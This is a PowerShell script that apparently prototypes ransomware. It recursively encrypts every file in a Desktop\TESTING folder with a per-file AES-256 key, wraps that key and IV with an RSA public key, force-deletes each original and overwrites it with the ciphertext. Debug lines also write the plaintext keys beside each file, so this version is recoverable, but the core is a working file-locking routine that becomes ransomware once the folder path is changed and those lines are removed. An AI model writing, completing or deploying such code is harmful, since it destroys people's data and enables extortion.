function Encrypt-File {
    param (
        [string]$filePath
    )

    $content = [System.IO.File]::ReadAllBytes($filePath)

    # Generate random AES Key and IV
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.KeySize = 256 # Explicitly set key size to 256 bits
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.GenerateKey()
    $aes.GenerateIV()

    # Encrypt AES key and IV with RSA
    $rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
    $rsa.FromXmlString((Get-Content publicKey.xml)) # Load Public key
    $encryptedAesKey = $rsa.Encrypt($aes.Key, $false)
    $encryptedAesIv = $rsa.Encrypt($aes.IV, $false)

    # Encrypt the content with AES
    $encryptor = $aes.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($content, 0, $content.Length)

    # Combine encrypted AES key, IV, and data
    $combinedData = $encryptedAesKey + $encryptedAesIv + $encryptedBytes

    # Delete the original file
    Remove-Item $filePath -Force

    # Write combined encrypted data to the same file
    [System.IO.File]::WriteAllBytes($filePath, $combinedData)

    Write-Host "Encrypted: $filePath"

    # Save AES key and IV for debugging (Optional) in Base64
    $aesKeyBase64 = [Convert]::ToBase64String($aes.Key)
    $aesIvBase64 = [Convert]::ToBase64String($aes.IV)

    # Save encrypted AES key and IV for debugging (Optional) in Base64
    $encryptedAesKeyBase64 = [Convert]::ToBase64String($encryptedAesKey)
    $encryptedAesIvBase64 = [Convert]::ToBase64String($encryptedAesIv)

    # Write AES Keys after the file has been encrypted.
    [System.IO.File]::WriteAllText("$filePath.aeskey", $aesKeyBase64)
    [System.IO.File]::WriteAllText("$filePath.aesiv", $aesIvBase64)
    [System.IO.File]::WriteAllText("$filePath.aeskey.enc", $encryptedAesKeyBase64)
    [System.IO.File]::WriteAllText("$filePath.aesiv.enc", $encryptedAesIvBase64)

}

$userDesktop = [Environment]::GetFolderPath("Desktop")
$testingFolder = Join-Path $userDesktop "TESTING"

if (-not (Test-Path $testingFolder -PathType Container)) {
    Write-Error "Testing folder not found: $testingFolder"
    return
}

$files = Get-ChildItem -Path $testingFolder -Recurse -File

foreach ($file in $files) {
    try {
        Encrypt-File -filePath $file.FullName
    }
    catch {
        Write-Error "Failed to process: $($file.FullName) - Error: $_"
    }
}

Write-Host "Encryption completed."